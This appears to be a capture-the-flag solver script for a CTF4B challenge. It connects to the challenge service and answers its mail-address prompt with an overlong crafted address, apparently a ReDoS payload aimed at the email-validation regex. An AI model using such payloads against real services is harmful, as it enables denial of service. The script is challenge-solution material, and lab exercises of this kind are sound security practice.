import os
from socket import *

def recvuntil(token):
    o = b''
    while True:
        o += io.recv(1)
        if token in o:
            break
    return o

HOST = os.getenv('CTF4B_HOST', '0.0.0.0')
PORT = int(os.getenv('CTF4B_PORT', '5100'))

payload = b'a@AAAAAAAAAA.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'

io = socket(AF_INET, SOCK_STREAM)
io.connect((HOST, PORT))

recvuntil(b'please puts your mail address.')
io.recv(1)
io.send(payload)
print(io.recv(0x100).decode('utf-8', 'ignore'), end='')

io.close()
